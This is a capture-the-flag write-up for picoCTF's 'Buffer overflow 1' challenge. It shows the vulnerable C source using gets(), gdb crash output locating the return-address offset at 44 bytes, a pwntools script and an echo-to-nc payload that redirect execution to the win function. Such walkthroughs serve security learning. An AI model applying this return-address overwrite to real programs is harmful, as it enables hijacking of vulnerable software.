# Buffer overflow 1
The problem statement:
```
Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the program. You can view source here. And connect with it using nc saturn.picoctf.net 64907
```
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
When we try to enter anything, it says jumping to an address. If we use gdb on the assembly code, we see the address for the function win is different. So we need to change the address we need to jump to. 
```
gdb vuln
GNU gdb (Debian 10.1-2) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from vuln...
(No debugging symbols found in vuln)
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049040  printf@plt
0x08049050  gets@plt
0x08049060  fgets@plt
0x08049070  getegid@plt
0x08049080  puts@plt
0x08049090  exit@plt
0x080490a0  __libc_start_main@plt
0x080490b0  setvbuf@plt
0x080490c0  fopen@plt
0x080490d0  setresgid@plt
0x080490e0  _start
0x08049120  _dl_relocate_static_pie
0x08049130  __x86.get_pc_thunk.bx
0x08049140  deregister_tm_clones
0x08049180  register_tm_clones
0x080491c0  __do_global_dtors_aux
0x080491f0  frame_dummy
0x080491f6  win
0x08049281  vuln
0x080492c4  main
0x0804933e  get_return_address
0x08049350  __libc_csu_init
0x080493c0  __libc_csu_fini
0x080493c5  __x86.get_pc_thunk.bp
0x080493cc  _fini
```
We need to see how the input will effect the address it is jumping to. So I used an online tool that gives me a string of necessary length. I input that into gdb after running the program. That caused some overflow and the address it is jumping to changed. Here's the website for it. https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html
```
Please enter your string: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Okay, time to return... Fingers Crossed... Jumping to 0x35624134

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x41 ('A')
EBX: 0x41326241 ('Ab2A')
ECX: 0x41 ('A')
EDX: 0xffffffff 
ESI: 0x1 
EDI: 0x80490e0 (<_start>:       endbr32)
EBP: 0x62413362 ('b3Ab')
ESP: 0xffffd0b0 ("Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
EIP: 0x35624134 ('4Ab5')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x35624134
[------------------------------------stack-------------------------------------]
0000| 0xffffd0b0 ("Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
0004| 0xffffd0b4 ("b7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
0008| 0xffffd0b8 ("8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
0012| 0xffffd0bc ("Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
0016| 0xffffd0c0 ("c1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
0020| 0xffffd0c4 ("2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
0024| 0xffffd0c8 ("Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
0028| 0xffffd0cc ("c5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x35624134 in ?? ()
```
That's great!! Now we just need to figure out how to change the address to what we need to jump to. The overflow occurs from the 44th character. And the rest of it is converted to hex and used as the address. So we use a small python script to convert the required address to its little endian form (the address of the win function) to the binary running and get the flag.

Here's the python script
```
from pwn import *
print("a"*44 + str(p32(0x080491f6)))
```
This prints out 
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb'\xf6\x91\x04\x08'
```
Now if we just run the binary and pipe echo with the -e attribute, it prints out the flag :D

```
The command would be echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08" | nc saturn.picoctf.net 56953
```